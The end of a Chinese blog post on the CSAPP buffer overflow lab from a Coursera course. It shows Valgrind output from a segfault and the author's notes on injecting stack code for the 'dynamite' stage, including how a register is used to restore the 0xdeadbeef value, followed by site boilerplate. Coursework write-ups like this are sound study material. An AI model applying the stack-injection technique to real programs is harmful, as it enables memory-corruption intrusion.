class="number">0xF4F4F4F4F4F4F4F3</span><span class="symbol">:</span> ???</span></div><div class="line">=<span class="ruby">=<span class="number">14149</span>==    by <span class="number">0xF4F4F4F4F4F4F4F3</span><span class="symbol">:</span> ???</span></div><div class="line">=<span class="ruby">=<span class="number">14149</span>==    by <span class="number">0xF4F4F4F4F4F4F4F3</span><span class="symbol">:</span> ???</span></div><div class="line">=<span class="ruby">=<span class="number">14149</span>==    by <span class="number">0xF4F4F4F4F4F4F4F3</span><span class="symbol">:</span> ???</span></div><div class="line">=<span class="ruby">=<span class="number">14149</span>==    by <span class="number">0xF4F4F4F4F4F4F4F3</span><span class="symbol">:</span> ???</span></div><div class="line">=<span class="ruby">=<span class="number">14149</span>==  <span class="constant">Address</span> <span class="number">0x7fffffffb900</span> is <span class="keyword">not</span> stack<span class="string">'d, malloc'</span>d <span class="keyword">or</span> (recently) free<span class="string">'d</span></span></div><div class="line">=<span class="ruby">=<span class="number">14149</span>== </span></div><div class="line">Ouch!: You caused a segmentation fault!</div><div class="line">Better luck next time</div><div class="line">=<span class="ruby">=<span class="number">14149</span>== </span></div><div class="line">=<span class="ruby">=<span class="number">14149</span>== <span class="constant">HEAP</span> <span class="constant">SUMMARY</span><span class="symbol">:</span></span></div><div class="line">=<span class="ruby">=<span class="number">14149</span>==     <span class="keyword">in</span> use at <span class="symbol">exit:</span> <span class="number">16</span>,<span class="number">392</span> bytes <span class="keyword">in</span> <span class="number">2</span> blocks</span></div><div class="line">=<span class="ruby">=<span class="number">14149</span>==   total heap <span class="symbol">usage:</span> <span class="number">2</span> allocs, <span class="number">0</span> frees, <span class="number">16</span>,<span class="number">392</span> bytes allocated</span></div><div class="line">=<span class="ruby">=<span class="number">14149</span>== </span></div><div class="line">=<span class="ruby">=<span class="number">14149</span>== <span class="constant">LEAK</span> <span class="constant">SUMMARY</span><span class="symbol">:</span></span></div><div class="line">=<span class="ruby">=<span class="number">14149</span>==    definitely <span class="symbol">lost:</span> <span class="number">0</span> bytes <span class="keyword">in</span> <span class="number">0</span> blocks</span></div><div class="line">=<span class="ruby">=<span class="number">14149</span>==    indirectly <span class="symbol">lost:</span> <span class="number">0</span> bytes <span class="keyword">in</span> <span class="number">0</span> blocks</span></div><div class="line">=<span class="ruby">=<span class="number">14149</span>==      possibly <span class="symbol">lost:</span> <span class="number">16</span>,<span class="number">384</span> bytes <span class="keyword">in</span> <span class="number">1</span> blocks</span></div><div class="line">=<span class="ruby">=<span class="number">14149</span>==    still <span class="symbol">reachable:</span> <span class="number">8</span> bytes <span class="keyword">in</span> <span class="number">1</span> blocks</span></div><div class="line">=<span class="ruby">=<span class="number">14149</span>==         <span class="symbol">suppressed:</span> <span class="number">0</span> bytes <span class="keyword">in</span> <span class="number">0</span> blocks</span></div><div class="line">=<span class="ruby">=<span class="number">14149</span>== <span class="constant">Rerun</span> with --leak-check=full to see details of leaked memory</span></div><div class="line">=<span class="ruby">=<span class="number">14149</span>== </span></div><div class="line">=<span class="ruby">=<span class="number">14149</span>== <span class="constant">For</span> counts of detected <span class="keyword">and</span> suppressed errors, rerun <span class="symbol">with:</span> -v</span></div><div class="line">=<span class="ruby">=<span class="number">14149</span>== <span class="constant">ERROR</span> <span class="constant">SUMMARY</span><span class="symbol">:</span> <span class="number">1</span> errors from <span class="number">1</span> contexts (<span class="symbol">suppressed:</span> <span class="number">2</span> from <span class="number">2</span>)</span></div></pre></td></tr></table></figure>


<p>看上去是直接跑stack空间的代码导致了问题……目前就卡在这里没有进展了……求大神指点迷津啊！</p>
<p><strong>(2014-08-05 Update)</strong> 今天早上来不甘心又试了下，比较了正常返回到<code>test</code>函数与从我注入的代码跳转回来时各寄存器的值，发现<code>%r10</code>原来是有值的，我就改成用<code>%r15</code>来放deadbeef了。改了注入后情况还是一样，gdb里通过直接命令行跑报错。记得老师上课说我们这种注入方法目前是没法用的，因为stack区域的代码理论上是不可执行的，所以我觉得报错也正常吧……又提交了一次结果这次竟然就满分了。有点诡异！另外之前我试着直接在汇编代码里写<code>movq $0xdeadbeef,-0x18(%rbp)</code>发现会报operand size mismatch错误。感觉是因为赋值太长，超出了指令最长8个字节的限制，所以还是用了个寄存器来中转下。不知道别的同学是用啥方法来复原这个deadbeef的。</p>
<h2 id="完结">完结</h2>
<p>足足花了两天时间搞这个，最后那个问题去论坛问了，有好多人碰到，暂时还没解答……发现问同样问题的人里有个中国人，一看他选的课跟我有很多重合的！再看了看他的LinkedIn，竟然是91年就上本科的大叔……目前是AT&amp;T的技术经理！一把年纪了还在Coursera上刷课，这种学习精神真是令人钦佩啊！我也要活到老学到老！</p>
  
	</div>
		<footer class="article-footer clearfix">
<div class="article-catetags">


  <div class="article-tags">
  
  <span></span> <a href="/tags/Assembly/">Assembly</a><a href="/tags/Coursera/">Coursera</a><a href="/tags/Linux/">Linux</a><a href="/tags/gdb/">gdb</a>
  </div>

</div>


<div class="article-share" id="share">

  <div data-url="http://zijie0.github.io/2014/08/04/CSAPP---Buffer-Overflow-Attacks/" data-title="CSAPP - Buffer Overflow Attacks | Tada!" data-tsina="null" class="share clearfix">
  </div>

</div>
</footer>   	       
	</article>
	
<nav class="article-nav clearfix">
 
 <div class="prev" >
 <a href="/2014/08/08/Python-Algorithms---Union-Find/" title="Python Algorithms - Union Find">
  <strong>上一篇：</strong><br/>
  <span>
  Python Algorithms - Union Find</span>
</a>
</div>


<div class="next">
<a href="/2014/07/24/Python-Algorithms---Knapsack-Problem/"  title="Python Algorithms - Knapsack Problem">
 <strong>下一篇：</strong><br/> 
 <span>Python Algorithms - Knapsack Problem
</span>
</a>
</div>

</nav>

	
<section class="comment">
	<div class="ds-thread"></div>
</section>


</div>  
      <div class="openaside"><a class="navbutton" href="#" title="Show Sidebar"></a></div>

  <div id="toc" class="toc-aside">
  <strong class="toc-title">Contents</strong>
 
 <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Binary_Bomb"><span class="toc-number">1.</span> <span class="toc-text">Binary Bomb</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Buffer_Overflow"><span class="toc-number">2.</span> <span class="toc-text">Buffer Overflow</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#原理"><span class="toc-number">2.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#smoke"><span class="toc-number">2.2.</span> <span class="toc-text">smoke</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fizz"><span class="toc-number">2.3.</span> <span class="toc-text">fizz</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#bang"><span class="toc-number">2.4.</span> <span class="toc-text">bang</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#dynamite"><span class="toc-number">2.5.</span> <span class="toc-text">dynamite</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#完结"><span class="toc-number">3.</span> <span class="toc-text">完结</span></a></li></ol>
 
  </div>

<div id="asidepart">
<div class="closeaside"><a class="closebutton" href="#" title="Hide Sidebar"></a></div>
<aside class="clearfix">

  

  
<div class="tagslist">
	<p class="asidetitle">Tags</p>
		<ul class="clearfix">
		
			<li><a href="/tags/Coursera/" title="Coursera">Coursera<sup>4</sup></a></li>
		
			<li><a href="/tags/Python/" title="Python">Python<sup>3</sup></a></li>
		
			<li><a href="/tags/Linux/" title="Linux">Linux<sup>2</sup></a></li>
		
			<li><a href="/tags/Algorithms/" title="Algorithms">Algorithms<sup>2</sup></a></li>
		
			<li><a href="/tags/Scala/" title="Scala">Scala<sup>1</sup></a></li>
		
			<li><a href="/tags/Assembly/" title="Assembly">Assembly<sup>1</sup></a></li>
		
			<li><a href="/tags/gdb/" title="gdb">gdb<sup>1</sup></a></li>
		
			<li><a href="/tags/Performance/" title="Performance">Performance<sup>1</sup></a></li>
		
			<li><a href="/tags/SystemTap/" title="SystemTap">SystemTap<sup>1</sup></a></li>
		
			<li><a href="/tags/book/" title="book">book<sup>1</sup></a></li>
		
			<li><a href="/tags/FP/" title="FP">FP<sup>1</sup></a></li>
		
		</ul>
</div>


  <div class="linkslist">
  <p class="asidetitle">Links</p>
    <ul>
      <li><a href="http://csrd.aliapp.com/" target="_blank" title="Ali">阿里核心系统团队博客</a></li>
      <li><a href="http://kernel.taobao.org/index.php" target="_blank" title="AliKernel">阿里内核组</a></li>
    </ul>
</div>

  <div class="rsspart">
	<a href="/atom.xml" target="_blank" title="rss">RSS</a>
</div>

</aside>
</div>
    </div>
    <footer><div id="footer" >
	
	<div class="line">
		<span></span>
		<div class="author"></div>
	</div>
	
	
	<div class="social-font" class="clearfix">
		
		<a href="http://weibo.com/010bytes" target="_blank" class="icon-weibo" title="weibo"></a>
		
		
		<a href="https://github.com/zijie0" target="_blank" class="icon-github" title="github"></a>
		
		
		
		
		
		<a href="https://www.douban.com/people/drinkdrink" target="_blank" class="icon-douban" title="豆瓣"></a>
		
		
		
		<a href="mailto:myoilbox@gmail.com" target="_blank" class="icon-email" title="Email Me"></a>
		
	</div>
		<p class="copyright">Powered by <a href="http://zespia.tw/hexo/" target="_blank" title="hexo">hexo</a> and Theme by <a href="https://github.com/wuchong/jacman" target="_blank" title="Pacman">Jacman</a> © 2015 
		
		<a href="http://zijie0.github.io/about" target="_blank" title="Zijie0">Zijie0</a>
		
		</p>
</div>
</footer>
    <script src="/js/jquery-2.0.3.min.js"></script>
<script type="text/javascript">
$(document).ready(function(){ 
  $('.navbar').click(function(){
    $('header nav').toggleClass('shownav');
  });
  var myWidth = 0;
  function getSize(){
    if( typeof( window.innerWidth ) == 'number' ) {
      myWidth = window.innerWidth;
    } else if( document.documentElement && document.documentElement.clientWidth) {
      myWidth = document.documentElement.clientWidth;
    };
  };
  var m = $('#main'),
      a = $('#asidepart'),
      c = $('.closeaside'),
      o = $('.openaside');
  $(window).resize(function(){
    getSize(); 
    if (myWidth >= 1024) {
      $('header nav').removeClass('shownav');
    }else
    {
      m.removeClass('moveMain');
      a.css('display', 'block').removeClass('fadeOut');
      o.css('display', 'none');
      
      $('#toc.toc-aside').css('display', 'none');
        
    }
  });
  c.click(function(){
    a.addClass('fadeOut').css('display', 'none');
    o.css('display', 'block').addClass('fadeIn');
    m.addClass('moveMain');
  });
  o.click(function(){
    o.css('display', 'none').removeClass('beforeFadeIn');
    a.css('display', 'block').removeClass('fadeOut').addClass('fadeIn');      
    m.removeClass('moveMain');
  });
  $(window).scroll(function(){
    o.css("top",Math.max(80,260-$(this).scrollTop()));
  });
});
</script>

<script type="text/javascript">
$(document).ready(function(){ 
  var ai = $('.article-content>iframe'),
      ae = $('.article-content>embed'),
      t  = $('#toc'),
      h  = $('article h2')
      ah = $('article h2'),
      ta = $('#toc.toc-aside'),
      o  = $('.openaside'),
      c  = $('.closeaside');
  if(ai.length>0){
    ai.wrap('<div class="video-container" />');
  };
  if(ae.length>0){
   ae.wrap('<div class="video-container" />');
  };
  if(ah.length==0){
    t.css('display','none');
  }else{
    c.click(function(){
      ta.css('display', 'block').addClass('fadeIn');
    });
    o.click(function(){
      ta.css('display', 'none');
    });
    $(window).scroll(function(){
      ta.css("top",Math.max(140,320-$(this).scrollTop()));
    });
  };
});
</script>


<script type="text/javascript">
$(document).ready(function(){ 
  var $this = $('.share'),
      url = $this.attr('data-url'),
      encodedUrl = encodeURIComponent(url),
      title = $this.attr('data-title'),
      tsina = $this.attr('data-tsina'),
      description = $this.attr('description');
  var html = [
  '<a href="#" class="overlay" id="qrcode"></a>',
  '<div class="qrcode clearfix"><span>扫描二维码分享到微信朋友圈</span><a class="qrclose" href="#share"></a><strong>Loading...Please wait</strong><img id="qrcode-pic" data-src="http://s.jiathis.com/qrcode.php?url=' + encodedUrl + '"/></div>',
  '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="article-share-facebook" target="_blank" title="Facebook"></a>',
  '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="article-share-twitter" target="_blank" title="Twitter"></a>',
  '<a href="#qrcode" class="article-share-qrcode" title="QRcode"></a>',
  '<a href="http://widget.renren.com/dialog/share?resourceUrl=' + encodedUrl + '&srcUrl=' + encodedUrl + '&title=' + title +'" class="article-share-renren" target="_blank" title="人人"></a>',
  '<a href="http://service.weibo.com/share/share.php?title='+title+'&url='+encodedUrl +'&ralateUid='+ tsina +'&searchPic=true&style=number' +'" class="article-share-weibo" target="_blank" title="Weibo"></a>',
  '<span title="Share to"></span>'
  ].join('');
  $this.append(html);
  $('.article-share-qrcode').click(function(){
    var imgSrc = $('#qrcode-pic').attr('data-src');
    $('#qrcode-pic').attr('src', imgSrc);
    $('#qrcode-pic').load(function(){
        $('.qrcode strong').text(' ');
    });
  });
});     
</script>



<script type="text/javascript">
  var duoshuoQuery = {short_name:"zijie0"};
  (function() {
    var ds = document.createElement('script');
    ds.type = 'text/javascript';ds.async = true;
    ds.src = '//static.duoshuo.com/embed.js';
    ds.charset = 'UTF-8';
    (document.getElementsByTagName('head')[0] 
    || document.getElementsByTagName('body')[0]).appendChild(ds);
  })();
</script> 







<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
<script src="/fancybox/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
$(document).ready(function(){ 
  $('.article-content').each(function(i){
    $(this).find('img').each(function(){
      if ($(this).parent().hasClass('fancybox')) return;
      var alt = this.alt;
      if (alt) $(this).after('<span class="caption">' + alt + '</span>');
      $(this).wrap('<a href="' + this.src + '" title="' + alt + '" class="fancybox"></a>');
    });
    $(this).find('.fancybox').each(function(){
      $(this).attr('rel', 'article' + i);
    });
  });
  if($.fancybox){
    $('.fancybox').fancybox();
  }
}); 
</script>




<script type="text/javascript">
(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
ga('create', 'UA-51424600-1', 'zijie0.github.io');  
ga('send', 'pageview');
</script>




<div id="totop">
<a title="Back to Top"><img src="/img/scrollup.png"/></a>
</div>

<script src="/js/totop.js"></script>




  </body>
</html>
